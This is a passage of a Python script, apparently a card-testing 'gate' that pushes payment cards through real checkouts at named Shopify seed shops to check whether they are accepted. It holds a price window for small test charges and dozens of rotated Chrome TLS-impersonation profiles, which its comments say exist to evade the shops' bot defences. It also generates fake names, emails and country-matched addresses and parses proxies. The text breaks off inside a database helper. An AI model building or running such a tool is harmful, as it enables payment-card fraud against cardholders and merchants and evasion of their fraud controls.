"""The native gate: the card is put into a real checkout.

The work is done by the script that does it, taken as it is: the
handshake of a browser, the goods list of the shop's own json, a thing
that is in stock and inside the price window, the basket, the
checkout, the price of the order as the shop says it, the card vault of
the shop, and the order.

The stores that cannot say anything are asked one after the other, and
what they say is passed on as they say it: a decline is a decline and a
broken store is a broken store, and the two are never mixed up.
"""

import asyncio
import json
import logging
import os
import random
import re
import sqlite3
import threading
import time
from typing import Optional
from urllib.parse import urlparse, quote

import aiohttp

try:
    from curl_cffi.requests import AsyncSession as CurlAsyncSession
    _CURL_CFFI_AVAILABLE = True
except ImportError:
    _CURL_CFFI_AVAILABLE = False

logger = logging.getLogger("shopify_native_gate")
# The Chrome that the hands of the machine are pretending to be.
_IMPERSONATE_TARGET = "chrome136"

# The price window.  A thing outside it is never put in the basket: a
# thing of a penny is refused by the shop, and a thing of twenty pounds
# is refused by the card.
MIN_VARIANT_PRICE = 1.00
MAX_VARIANT_PRICE = 23.00

# The things that are always taken from these shops.  They are the ones
# that are known to be in stock and to be inside the window.
FORCED_VARIANTS = {
    "www.gurneys.com": ("51622108299636", "4.99"),
    "gurneys.com": ("51622108299636", "4.99"),
    "store.trueleafmarket.com": ("40444552840", "3.39"),
    "www.botanicalinterests.com": ("45090234106109", "2.99"),
    "botanicalinterests.com": ("45090234106109", "2.99"),
    "16acfa-2.myshopify.com": ("47869966516497", "1.00"),
}

# The shops that are asked when no shop is named.
DEFAULT_SITE_ROTATION = [
    "https://www.gurneys.com",
    "https://store.trueleafmarket.com",
    "https://www.botanicalinterests.com",
    "https://16acfa-2.myshopify.com",
]

# ---------------------------------------------------------------------------
# The browser profiles.  Each one is a whole computer: the address of the
# browser, the address of the operating system, and the handshake of the
# TLS.  They are taken at random, so no two cards look like the same
# computer twice.
# ---------------------------------------------------------------------------
_BROWSER_PROFILES = [
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36", "sec_ch_ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"', "impersonate": "chrome136", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"', "impersonate": "chrome136", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6478.127 Safari/537.36", "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"', "impersonate": "chrome136", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"', "impersonate": "chrome136", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6478.55 Safari/537.36", "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"', "impersonate": "chrome136", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"', "impersonate": "chrome136", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"', "impersonate": "chrome131", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"', "impersonate": "chrome131", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.266 Safari/537.36", "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"', "impersonate": "chrome131", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"', "impersonate": "chrome131", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"', "impersonate": "chrome131", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0", "sec_ch_ua": '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"', "impersonate": "chrome131", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "impersonate": "chrome124", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36", "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "impersonate": "chrome124", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "impersonate": "chrome124", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "impersonate": "chrome124", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "impersonate": "chrome124", "platform": '"Linux"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0", "sec_ch_ua": '"Microsoft Edge";v="124", "Chromium";v="124", "Not-A.Brand";v="99"', "impersonate": "chrome124", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", "sec_ch_ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"', "impersonate": "chrome123", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", "sec_ch_ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"', "impersonate": "chrome123", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", "sec_ch_ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"', "impersonate": "chrome123", "platform": '"Linux"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', "impersonate": "chrome120", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', "impersonate": "chrome120", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', "impersonate": "chrome120", "platform": '"Linux"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0", "sec_ch_ua": '"Microsoft Edge";v="120", "Chromium";v="120", "Not_A Brand";v="8"', "impersonate": "chrome120", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "sec_ch_ua": '"Google Chrome";v="119", "Not=A?Brand";v="24"', "impersonate": "chrome119", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "sec_ch_ua": '"Google Chrome";v="119", "Not=A?Brand";v="24"', "impersonate": "chrome119", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "sec_ch_ua": '"Google Chrome";v="119", "Not=A?Brand";v="24"', "impersonate": "chrome119", "platform": '"Linux"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.188 Safari/537.36", "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"', "impersonate": "chrome116", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36", "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"', "impersonate": "chrome116", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"', "impersonate": "chrome116", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"', "impersonate": "chrome116", "platform": '"Linux"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"', "impersonate": "chrome110", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"', "impersonate": "chrome110", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="107", "Google Chrome";v="107", "Not=A?Brand";v="24"', "impersonate": "chrome107", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="107", "Google Chrome";v="107", "Not=A?Brand";v="24"', "impersonate": "chrome107", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "sec_ch_ua": '"Chromium";v="107", "Google Chrome";v="107", "Not=A?Brand";v="24"', "impersonate": "chrome107", "platform": '"Linux"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36", "sec_ch_ua": '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"', "impersonate": "chrome104", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36", "sec_ch_ua": '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"', "impersonate": "chrome104", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36", "sec_ch_ua": '"Chromium";v="101", " Not;A Brand";v="99", "Google Chrome";v="101"', "impersonate": "chrome101", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36", "sec_ch_ua": '"Chromium";v="101", " Not;A Brand";v="99", "Google Chrome";v="101"', "impersonate": "chrome101", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53", "sec_ch_ua": '"Chromium";v="101", " Not;A Brand";v="99", "Microsoft Edge";v="101"', "impersonate": "chrome101", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36", "sec_ch_ua": '"Chromium";v="100", " Not A;Brand";v="99", "Google Chrome";v="100"', "impersonate": "chrome100", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36", "sec_ch_ua": '"Chromium";v="100", " Not A;Brand";v="99", "Google Chrome";v="100"', "impersonate": "chrome100", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36", "sec_ch_ua": '"Chromium";v="99", " Not A;Brand";v="99", "Google Chrome";v="99"', "impersonate": "chrome99", "platform": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36", "sec_ch_ua": '"Chromium";v="99", " Not A;Brand";v="99", "Google Chrome";v="99"', "impersonate": "chrome99", "platform": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.46", "sec_ch_ua": '"Chromium";v="99", " Not A;Brand";v="99", "Microsoft Edge";v="99"', "impersonate": "chrome99", "platform": '"Windows"', "mobile": "?0"},
]

UA = _BROWSER_PROFILES[0]["ua"]
SEC_CH_UA = _BROWSER_PROFILES[0]["sec_ch_ua"]

_VALID_IMPERSONATE = {
    "chrome99", "chrome100", "chrome101", "chrome104", "chrome107",
    "chrome110", "chrome116", "chrome119", "chrome120", "chrome123",
    "chrome124", "chrome131", "chrome136",
}


def pick_browser_profile() -> dict:
    """A whole computer, taken at random.

    The newest Chrome is the one that is asked for most of the time,
    because it is the one that gives the least trouble.
    """
    modern = [p for p in _BROWSER_PROFILES
              if p.get("impersonate") in ("chrome136", "chrome131", "chrome124",
                                          "chrome123", "chrome120")]
    pool = modern if modern else _BROWSER_PROFILES
    return random.choice(pool)


# ---------------------------------------------------------------------------
# The addresses.  The address is of the country the shop is in, so the
# shop is not given a card from one country and an address from another.
# ---------------------------------------------------------------------------
_ADDR_BOOK = {
    "US": [
        {"address1": "4521 Broadway Ave", "city": "Chicago", "postalCode": "60613", "zoneCode": "IL", "phone": "3125557842"},
        {"address1": "1847 Maple Drive", "city": "Houston", "postalCode": "77002", "zoneCode": "TX", "phone": "7135552341"},
        {"address1": "392 Oak Street", "city": "Phoenix", "postalCode": "85001", "zoneCode": "AZ", "phone": "6025551234"},
        {"address1": "7834 Pine Ave", "city": "Philadelphia", "postalCode": "19103", "zoneCode": "PA", "phone": "2155559876"},
        {"address1": "2201 Cedar Blvd", "city": "San Antonio", "postalCode": "78201", "zoneCode": "TX", "phone": "2105554567"},
        {"address1": "934 Elm Street", "city": "San Diego", "postalCode": "92101", "zoneCode": "CA", "phone": "6195552345"},
        {"address1": "5512 Birch Lane", "city": "Dallas", "postalCode": "75201", "zoneCode": "TX", "phone": "2145556789"},
        {"address1": "1103 Walnut Drive", "city": "Jacksonville", "postalCode": "32099", "zoneCode": "FL", "phone": "9045551234"},
        {"address1": "678 Spruce Street", "city": "Columbus", "postalCode": "43004", "zoneCode": "OH", "phone": "6145557890"},
        {"address1": "2847 Willow Way", "city": "Charlotte", "postalCode": "28201", "zoneCode": "NC", "phone": "7045553456"},
        {"address1": "445 River Road", "city": "Indianapolis", "postalCode": "46201", "zoneCode": "IN", "phone": "3175558901"},
        {"address1": "3390 Lake View Dr", "city": "Seattle", "postalCode": "98101", "zoneCode": "WA", "phone": "2065552345"},
        {"address1": "1256 Highland Ave", "city": "Denver", "postalCode": "80201", "zoneCode": "CO", "phone": "7205551234"},
        {"address1": "889 Summit Circle", "city": "Nashville", "postalCode": "37201", "zoneCode": "TN", "phone": "6155557654"},
        {"address1": "724 Forest Drive", "city": "Louisville", "postalCode": "40201", "zoneCode": "KY", "phone": "5025556789"},
        {"address1": "4102 Sunset Blvd", "city": "Las Vegas", "postalCode": "89101", "zoneCode": "NV", "phone": "7025551234"},
        {"address1": "601 Park Place", "city": "Atlanta", "postalCode": "30301", "zoneCode": "GA", "phone": "4045556789"},
        {"address1": "2389 Hillcrest Ave", "city": "Memphis", "postalCode": "38101", "zoneCode": "TN", "phone": "9015559012"},
        {"address1": "3012 Meadow Lane", "city": "Oklahoma City", "postalCode": "73101", "zoneCode": "OK", "phone": "4055553210"},
        {"address1": "1567 Valley Road", "city": "Portland", "postalCode": "97201", "zoneCode": "OR", "phone": "5035554567"},
    ],
    "GB": [
        {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "ENG", "phone": "2079460123"},
        {"address1": "14 Downing Street", "city": "London", "postalCode": "SW1A 2AA", "zoneCode": "ENG", "phone": "2079250918"},
        {"address1": "42 Victoria Road", "city": "Manchester", "postalCode": "M1 2GH", "zoneCode": "ENG", "phone": "1612349876"},
        {"address1": "8 Princes Street", "city": "Edinburgh", "postalCode": "EH2 2YJ", "zoneCode": "SCT", "phone": "1312209000"},
        {"address1": "5 Queen Street", "city": "Cardiff", "postalCode": "CF10 2BX", "zoneCode": "WLS", "phone": "2920223883"},
    ],
    "CA": [
        {"address1": "88 Queen Street", "city": "Toronto", "postalCode": "M5J 2J3", "zoneCode": "ON", "phone": "4165550198"},
        {"address1": "1055 West Georgia", "city": "Vancouver", "postalCode": "V6E 3P3", "zoneCode": "BC", "phone": "6045550199"},
        {"address1": "737 Hastings Street", "city": "Vancouver", "postalCode": "V6C 3M8", "zoneCode": "BC", "phone": "6045559001"},
        {"address1": "100 King Street W", "city": "Toronto", "postalCode": "M5X 1B1", "zoneCode": "ON", "phone": "4165556789"},
        {"address1": "901 Jasper Ave", "city": "Edmonton", "postalCode": "T5J 3L7", "zoneCode": "AB", "phone": "7805554321"},
    ],
    "AU": [
        {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "phone": "291234567"},
        {"address1": "360 Collins Street", "city": "Melbourne", "postalCode": "3000", "zoneCode": "VIC", "phone": "396541234"},
        {"address1": "100 St Georges Tce", "city": "Perth", "postalCode": "6000", "zoneCode": "WA", "phone": "892121234"},
        {"address1": "232 Adelaide Street", "city": "Brisbane", "postalCode": "4000", "zoneCode": "QLD", "phone": "731231234"},
        {"address1": "50 Grenfell Street", "city": "Adelaide", "postalCode": "5000", "zoneCode": "SA", "phone": "882031234"},
    ],
    "NZ": [
        {"address1": "157 Lambton Quay", "city": "Wellington", "postalCode": "6011", "zoneCode": "WGN", "phone": "44990010"},
        {"address1": "21 Queen Street", "city": "Auckland", "postalCode": "1010", "zoneCode": "AUK", "phone": "93570001"},
    ],
    "IN": [
        {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "phone": "9876543210"},
        {"address1": "14 Park Street", "city": "Kolkata", "postalCode": "700016", "zoneCode": "WB", "phone": "9831234567"},
        {"address1": "8 Connaught Place", "city": "New Delhi", "postalCode": "110001", "zoneCode": "DL", "phone": "9811234567"},
        {"address1": "12 Brigade Road", "city": "Bengaluru", "postalCode": "560001", "zoneCode": "KA", "phone": "9901234567"},
    ],
    "EUR": [
        {"address1": "Unter den Linden 1", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "phone": "3022310000", "countryCode": "DE"},
        {"address1": "1 Rue de Rivoli", "city": "Paris", "postalCode": "75001", "zoneCode": "IDF", "phone": "140205000", "countryCode": "FR"},
        {"address1": "Via del Corso 1", "city": "Rome", "postalCode": "00186", "zoneCode": "RM", "phone": "0639967700", "countryCode": "IT"},
        {"address1": "Gran Via 1", "city": "Madrid", "postalCode": "28013", "zoneCode": "MD", "phone": "915231234", "countryCode": "ES"},
        {"address1": "Herengracht 1", "city": "Amsterdam", "postalCode": "1015BA", "zoneCode": "NH", "phone": "205551234", "countryCode": "NL"},
    ],
    "AED": [
        {"address1": "Burj Khalifa Tower", "city": "Dubai", "postalCode": "00000", "zoneCode": "DU", "phone": "045551234"},
        {"address1": "Sheikh Zayed Road", "city": "Abu Dhabi", "postalCode": "00000", "zoneCode": "AZ", "phone": "025557890"},
    ],
    "SGD": [
        {"address1": "1 Raffles Place", "city": "Singapore", "postalCode": "048616", "zoneCode": "SG", "phone": "65551234"},
        {"address1": "9 Orchard Road", "city": "Singapore", "postalCode": "238880", "zoneCode": "SG", "phone": "67891234"},
    ],
    "HKD": [
        {"address1": "1 Nathan Road", "city": "Kowloon", "postalCode": "999077", "zoneCode": "KLN", "phone": "27361234"},
        {"address1": "88 Queens Road", "city": "Hong Kong", "postalCode": "999077", "zoneCode": "HKI", "phone": "25251234"},
    ],
}

_CURRENCY_TO_COUNTRY = {
    "USD": "US", "GBP": "GB", "CAD": "CA", "AUD": "AU", "NZD": "NZ",
    "INR": "IN", "AED": "AED", "SGD": "SGD", "HKD": "HKD", "EUR": "EUR",
}

US_ADDRESSES = _ADDR_BOOK["US"]

_FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David",
                "Mary", "Patricia", "Jennifer", "Linda", "Thomas", "Charles",
                "Daniel", "Matthew", "Anthony", "Jessica", "Sarah", "Karen",
                "Lisa", "Nancy"]
_LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
               "Miller", "Davis", "Rodriguez", "Wilson", "Martinez",
               "Anderson", "Taylor", "Thomas", "Moore"]
_EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com",
                  "icloud.com"]


# The name of the country in the name of the shop.  A shop of another
# country does not send to us, and says so, and the card is of no use
# there.
_TLD_COUNTRY = {
    "ca": "CA", "uk": "GB", "co.uk": "GB", "au": "AU", "com.au": "AU",
    "nz": "NZ", "co.nz": "NZ", "in": "IN", "co.in": "IN",
    "de": "DE", "fr": "FR", "it": "IT", "es": "ES", "nl": "NL",
    "ie": "IE", "se": "SE", "dk": "DK", "no": "NO", "fi": "FI",
    "pl": "PL", "pt": "PT", "be": "BE", "at": "AT", "ch": "CH",
    "eu": "EUR", "de": "DE", "ae": "AED", "za": "US", "sg": "SGD",
    "hk": "HKD", "jp": "US", "mx": "US", "br": "US", "us": "US",
}


def _the_country_of_the_shop(host: str, currency: str = "USD") -> str:
    """The country the shop is in, from its name or from its money."""
    host = (host or "").lower()
    for tail in ("com.au", "co.uk", "co.nz", "co.in", "com.br", "com.mx"):
        if host.endswith("." + tail):
            return _TLD_COUNTRY.get(tail, "US")
    parts = host.split(".")
    if len(parts) >= 2:
        tail = parts[-1]
        if tail in _TLD_COUNTRY:
            return _TLD_COUNTRY[tail]
    return _CURRENCY_TO_COUNTRY.get((currency or "USD").upper(), "US")


def pick_addr(currency: str = "USD", host: str = "") -> dict:
    """An address of the country the shop is in.

    The shop is told the country of the address, and the address is of
    the country the shop is in, for a shop of another country does not
    send to us.
    """
    cc_map = {"US": "US", "GB": "GB", "CA": "CA", "AU": "AU", "NZ": "NZ",
              "IN": "IN", "AED": "AE", "SGD": "SG", "HKD": "HK", "EUR": None}
    pool_key = _CURRENCY_TO_COUNTRY.get((currency or "USD").upper(), "US")
    pool = _ADDR_BOOK.get(pool_key, _ADDR_BOOK["US"])
    entry = random.choice(pool).copy()
    if "countryCode" not in entry:
        entry["countryCode"] = cc_map.get(pool_key, "US")
    return entry


def random_identity() -> tuple:
    """A name and an address of mail to go with it."""
    first = random.choice(_FIRST_NAMES)
    last = random.choice(_LAST_NAMES)
    email = "%s%s%d@%s" % (first.lower(), last.lower(), random.randint(10, 9999),
                            random.choice(_EMAIL_DOMAINS))
    return first, last, email


def parse_proxy(proxy_str):
    """The proxy, as a browser would be given it."""
    if not proxy_str:
        return None
    s = proxy_str.strip()
    if "://" in s:
        p = urlparse(s)
        if p.username or p.password:
            u = quote(p.username or "", safe="")
            pw = quote(p.password or "", safe="")
            scheme = p.scheme or "http"
            hp = "%s:%s" % (p.hostname, p.port) if p.port else p.hostname
            return "%s://%s:%s@%s" % (scheme, u, pw, hp)
        return s
    if "@" in s:
        at = s.rfind("@")
        cred, hp = s[:at], s[at + 1:]
        col = cred.find(":")
        u = quote(cred[:col], safe="") if col >= 0 else quote(cred, safe="")
        pw = quote(cred[col + 1:], safe="") if col >= 0 else ""
        return "http://%s:%s@%s" % (u, pw, hp)
    parts = s.split(":")
    if len(parts) == 4:
        ip, port, u, pw = parts
        return "http://%s:%s@%s:%s" % (quote(u, safe=""), quote(pw, safe=""),
                                       ip, port)
    if len(parts) == 2:
        return "http://%s:%s" % (parts[0], parts[1])
    return s


def make_connector():
    """A connector for the asking that does not hold on to the sockets."""
    return aiohttp.TCPConnector(ssl=False, force_close=True,
                                enable_cleanup_closed=True)


def make_cffi_session(proxy_str=None, profile: dict = None):
    """The handshake of a browser.

    The shops and the walls in front of them look at the handshake of
    the TLS, and a program that does not look like a browser is turned
    away before it reaches the shop.  So the handshake is that of a
    Chrome, and the address of the browser is the one of the profile.
    """
    if not _CURL_CFFI_AVAILABLE:
        return None
    if profile is None:
        profile = pick_browser_profile()
    impersonate = profile.get("impersonate", _IMPERSONATE_TARGET)
    if impersonate not in _VALID_IMPERSONATE:
        impersonate = "chrome136"
    kwargs = {"impersonate": impersonate, "verify": False, "timeout": 20}
    if proxy_str:
        kwargs["proxies"] = {"http": proxy_str, "https": proxy_str}
    return CurlAsyncSession(**kwargs)


def extract_between(text, start, end):
    """The words between two marks."""
    if not text or not start or not end:
        return None
    try:
        if start in text:
            part = text.split(start, 1)[1]
            if end in part:
                val = part.split(end, 1)[0]
                return val if val else None
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# The things that are in stock, out of the database of the finder.
# ---------------------------------------------------------------------------
_DB_LOCK = threading.Lock()
_DB_CONN = None


def _get_db():
    """The database of the things, opened for reading only."""
    global _DB_CONN
    if _DB_CONN is None:
        with _DB_LOCK:
            if _DB_CONN is None:
                if not os.path.exists(_DB_PATH):
                    logger.info("the database of the things is not here")
                    return None
